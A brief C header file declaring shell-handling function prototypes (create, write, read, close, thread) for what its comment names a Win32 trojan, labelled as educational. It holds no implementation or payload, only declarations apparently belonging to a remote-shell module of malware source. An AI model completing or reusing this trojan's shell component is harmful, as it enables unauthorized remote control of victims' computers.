/*
	Educational purposes only
	GPL LICENSE:  @Cr1m3 / JennyLab
	Win32/cr1m3.tr0jan
*/

#ifndef __SHELL_H_FILE
#define __SHELL_H_FILE


int __shell_new(char *command);
int __shell_write(char *command);
int __shell_read(void);
int __shell_close(void);
unsigned long __stdcall __shell_thread(void *param);

#endif
